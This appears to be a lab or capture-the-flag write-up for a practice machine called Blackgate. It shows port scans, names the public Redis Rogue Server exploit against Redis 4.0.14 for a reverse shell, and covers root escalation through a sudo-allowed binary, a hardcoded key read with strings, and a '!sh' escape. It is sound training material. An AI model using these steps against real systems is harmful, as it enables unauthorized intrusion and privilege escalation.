# Blackgate

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.176
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 23:04 +08
Nmap scan report for 192.168.197.176
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
```

Only Redis. We can do a detailed scan for this port.&#x20;

```
$ sudo nmap -p 6379 -sC -sV -O -T4 192.168.197.176                                 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 23:05 +08
Nmap scan report for 192.168.197.176
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14
```

### Redis RCE

This version of Redis is vulnerable to the Redis Rogue Server exploit:

{% embed url="https://github.com/n0b0dyCN/redis-rogue-server" %}

<figure><img src="../../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

Getting a reverse shell via a bash one-liner is trivial:

<figure><img src="../../../.gitbook/assets/image (3358).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Redis-Status

We had some `sudo` privileges as this user:

```
prudence@blackgate:/tmp$ sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

I did some basic enumeration of this binary, such as running `strings`:

```
prudence@blackgate:~$ strings /usr/local/bin/redis-status
/lib64/ld-linux-x86-64.so.2
gets
puts
printf
stderr
system
fwrite
strcmp
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
H=X@@
[]A\A]A^A_
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
```

There is a password within it. When we run the binary and supply the password, we get this 'terminal' thing:

<figure><img src="../../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

This output looks a bit like `less`, so I tried to escape this limited shell with `!sh` and it worked.

<figure><img src="../../../.gitbook/assets/image (1757).png" alt=""><figcaption></figcaption></figure>

Rooted!
